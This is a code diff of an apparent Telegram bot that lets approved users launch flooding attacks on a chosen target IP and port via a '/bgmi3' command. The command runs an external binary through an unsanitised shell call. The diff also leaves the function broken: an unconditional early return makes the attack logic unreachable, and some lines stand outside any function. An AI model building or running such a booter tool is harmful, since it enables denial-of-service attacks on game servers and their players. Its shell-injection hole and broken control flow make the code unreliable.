@@ -404,50 +404,41 @@ COOLDOWN_TIME =0
 @bot.message_handler(commands=['bgmi3'])
 def handle_bgmi3(message):
     user_id = str(message.chat.id)  # Define user_id properly
-    else:
-        logging.error('Error: message variable is not defined.')
-        return
+    
+    logging.error('Error: message variable is not defined.')
+    return
 
     if user_id in allowed_user_ids:
-        # Check the number of ongoing attacks
         if len(ongoing_attacks) >= MAX_CONCURRENT_ATTACKS:
             response = "Too many concurrent attacks are running. Please wait until some finish."
-            bot.reply_to(message, f"{Fore.CYAN + Style.BRIGHT}\n━━━━━━━━━━━━━━━━━━━━\n" + str( response) + "\n━━━━━━━━━━━━━━━━━━━━\n" + Style.RESET_ALL)
+            bot.reply_to(message, response)
             return
 
-        # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
-            # Check if the user has run the command before and is still within the cooldown period
             if user_id in bgmi3_cooldown and (datetime.datetime.now() - bgmi3_cooldown[user_id]).seconds < COOLDOWN_TIME:
                 response = "You Are On Cooldown ❌. Please Wait Before Running The /bgmi3 Command Again."
-                bot.reply_to(message, f"{Fore.CYAN + Style.BRIGHT}\n━━━━━━━━━━━━━━━━━━━━\n" + str( response) + "\n━━━━━━━━━━━━━━━━━━━━\n" + Style.RESET_ALL)
+                bot.reply_to(message, response)
                 return
 
-            # Update the last time the user ran the command
             bgmi3_cooldown[user_id] = datetime.datetime.now()
 
         command = message.text.split()
-        if len(command) == 4:  # Updated to accept target, time, and port
+        if len(command) == 4:
             target = command[1]
-            port = int(command[2])  # Convert port to integer
-            time = int(command[3])  # Convert time to integer
+            port = int(command[2])
+            time = int(command[3])
             if time > 240:
                 response = "Error: Time interval must be less than 240."
             else:
-                # Add this attack to the ongoing attacks
                 ongoing_attacks[user_id] = datetime.datetime.now()
-
-                record_command_logs(user_id, '/bgmi3', target, port, time)
-                log_command(user_id, target, port, time)
-                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
+                start_attack_reply(message, target, port, time)
                 full_command = f"./Rahul {target} {port} {time} 900"
-                process = subprocess.run(full_command, shell=True)
+                subprocess.run(full_command, shell=True)
 
-# Remove user from ongoing_attacks after attack completes
-try:
-    ongoing_attacks.pop(user_id)
-except KeyError:
-    logging.warning(f"User ID {user_id} not found in ongoing_attacks")
+                try:
+                    ongoing_attacks.pop(user_id)
+                except KeyError:
+                    logging.warning(f"User ID {user_id} not found in ongoing_attacks")
 
 # Get attacker name
 user_info = message.from_user
